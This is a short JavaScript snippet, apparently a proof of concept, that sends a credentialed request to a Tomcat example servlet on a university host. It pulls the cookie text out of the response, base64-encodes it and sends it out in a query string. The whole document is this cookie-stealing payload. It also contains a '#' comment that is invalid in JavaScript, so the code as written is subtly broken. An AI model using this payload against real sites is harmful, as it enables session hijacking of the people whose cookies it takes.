var req = new XMLHttpRequest();
req.onload = reqListener;
var url = 'https://alumno2.unlam.edu.ar/examples/servlets/servlet/CookieExample';
req.withCredentials = true; // send cookie header
req.open('GET', url, false);
req.send();

function reqListener() {
var req2 = new XMLHttpRequest();
const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 ); # Thats ugly, improve it :)
req2.open('GET', 'https://alumno2.unlam.edu.ar/examples/servlets/servlet/?data=' + btoa(sess), false);
req2.send()
};
